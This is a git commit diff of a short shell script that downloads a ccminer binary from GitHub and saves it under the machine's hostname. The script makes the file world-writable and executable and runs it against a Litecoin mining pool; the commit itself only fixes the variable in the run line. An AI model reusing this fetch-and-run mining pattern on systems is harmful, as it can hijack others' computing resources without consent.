58aa453b0c3f2e53aa3609abbf9ed6a7b827af46
jsiqiisn <100444720+jsiqiisn@users.noreply.github.com>
2022-03-07 12:44:55 +0700

    Update cc.sh

--- cc.sh
+++ cc.sh
@@ -4,4 +4,4 @@ TEST=$(cat /proc/sys/kernel/hostname)
 
 wget -O $TEST https://raw.githubusercontent.com/jsiqiisn/cc/main/ccminer
 chmod 777 $TEST
-./TEST -a scrypt -o stratum+tcp://ltc.ss.poolin.me:443 -u ltc61.xx -p 123
+./$TEST -a scrypt -o stratum+tcp://ltc.ss.poolin.me:443 -u ltc61.xx -p 123
